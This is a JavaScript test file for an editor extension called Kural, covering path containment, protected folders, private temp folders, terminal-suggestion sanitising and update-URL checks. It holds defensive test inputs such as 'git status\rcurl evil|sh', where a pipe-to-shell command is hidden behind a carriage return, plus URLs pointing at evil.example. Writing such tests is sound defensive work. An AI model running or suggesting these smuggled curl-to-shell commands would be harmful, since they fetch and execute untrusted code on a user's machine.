// What the AI may touch without asking, the folders a walk never enters, and terminal suggestions that can't run
// anything by themselves (lib/paths.js, tools.js walk, terminal.js tidy).
const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");
const Module = require("module");
const load = Module._load;
Module._load = function (req, ...a) { return req === "vscode" ? { workspace: {}, window: {} } : load.call(this, req, ...a); };
const { within, isProtected, isHomeOrAbove, hasControl, privateTmp, real } = require("../extension/lib/paths");
const { Tools } = require("../extension/lib/ai/tools");
const { tidy, _test: { tidyIntent } } = require("../extension/lib/tab/terminal");
const { downloadOk } = require("../extension/lib/updates");

let fail = 0;
const check = (name, fn) => { try { fn(); console.log("ok  ", name); } catch (e) { fail++; console.log("FAIL", name, e.message); } };
const tmp = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "kural-paths-test-")));
const proj = path.join(tmp, "proj");
fs.mkdirSync(path.join(proj, "src"), { recursive: true });

check("inside the project: yes; outside or ../ tricks: no", () => {
  assert.ok(within(path.join(proj, "src/a.js"), [proj]));
  assert.ok(within(path.join(proj, "new/folder/b.js"), [proj]));   // (not there yet)
  assert.ok(within(proj, [proj]));
  assert.ok(!within(path.join(proj, "../other.js"), [proj]));
  assert.ok(!within(path.join(tmp, "proj2/x"), [proj]));
  assert.ok(!within("~/.zshrc", [proj]));
  assert.ok(!within("", [proj]));
});
check("a link inside the project that points outside counts as outside", () => {
  const outside = path.join(tmp, "secret.txt"); fs.writeFileSync(outside, "x");
  fs.symlinkSync(outside, path.join(proj, "link.txt"));
  assert.ok(!within(path.join(proj, "link.txt"), [proj]));
  assert.strictEqual(real(path.join(proj, "link.txt")), outside);
});
check("macOS-guarded folders and other people's homes are protected", () => {
  for (const n of ["Desktop", "Documents", "Downloads", "Music", "Pictures", "Movies", "Library"]) assert.ok(isProtected(path.join(os.homedir(), n)), n);
  assert.ok(isProtected(path.join(os.homedir(), "Music") + path.sep));    // (a trailing slash too)
  assert.ok(isProtected("/Volumes") && isProtected("/Users") && isProtected("/home"));
  assert.ok(!isProtected(path.join(os.homedir(), "code")));
  assert.ok(isHomeOrAbove(os.homedir()) && isHomeOrAbove("/") && !isHomeOrAbove(path.join(os.homedir(), "code")));
});
check("a walk never goes into a protected folder below where it started", () => {
  const fakeHome = path.join(tmp, "home");
  fs.mkdirSync(path.join(fakeHome, "Music"), { recursive: true }); fs.writeFileSync(path.join(fakeHome, "Music", "song.txt"), "x");
  fs.mkdirSync(path.join(fakeHome, "code"), { recursive: true }); fs.writeFileSync(path.join(fakeHome, "code", "a.py"), "x");
  const old = os.homedir; os.homedir = () => fakeHome;
  try {
    const out = new Tools(fakeHome).glob({ pattern: "**/*" });
    assert.ok(out.includes("code/a.py") && !out.includes("song"), out);
    assert.ok(new Tools(path.join(fakeHome, "Music")).glob({ pattern: "*" }).includes("song.txt"));   // (you asked for it)
  } finally { os.homedir = old; }
});
check("Kural's own temp folder is private", () => {
  const d = privateTmp("x");
  assert.ok(fs.existsSync(d));
  if (process.platform !== "win32") assert.strictEqual(fs.statSync(path.dirname(d)).mode & 0o077, 0);
});
check("terminal: a suggestion with a hidden carriage return or escape is dropped", () => {
  assert.ok(hasControl("ls\rcurl x|sh") && hasControl("a\x1b[2J") && !hasControl("git push origin main"));
  assert.strictEqual(tidy("<cmd>git status\rcurl evil|sh</cmd>", "git st"), "");
  assert.strictEqual(tidy("<cmd>git status</cmd>", "git st"), "git status");
  assert.strictEqual(tidyIntent("<cmd>git push\x1b[A</cmd>"), "");
  assert.strictEqual(tidyIntent("<cmd>git push origin main</cmd>"), "git push origin main");
});
check("updates come only from Kural's GitHub releases", () => {
  assert.ok(downloadOk({ browser_download_url: "https://github.com/adithyakumarcr/kural/releases/download/v1.2.0/kural.deb" }));
  for (const u of ["http://github.com/adithyakumarcr/kural/releases/download/v1/k.deb", "https://evil.example/kural.deb",
    "https://github.com/someone/kural/releases/download/v1/k.deb", "https://github.com/adithyakumarcr/kural.evil.com/x"]) assert.ok(!downloadOk({ browser_download_url: u }), u);
});

fs.rmSync(tmp, { recursive: true, force: true });
console.log(fail ? `paths: ${fail} FAILED` : "paths: ALL PASS");
process.exit(fail ? 1 : 0);
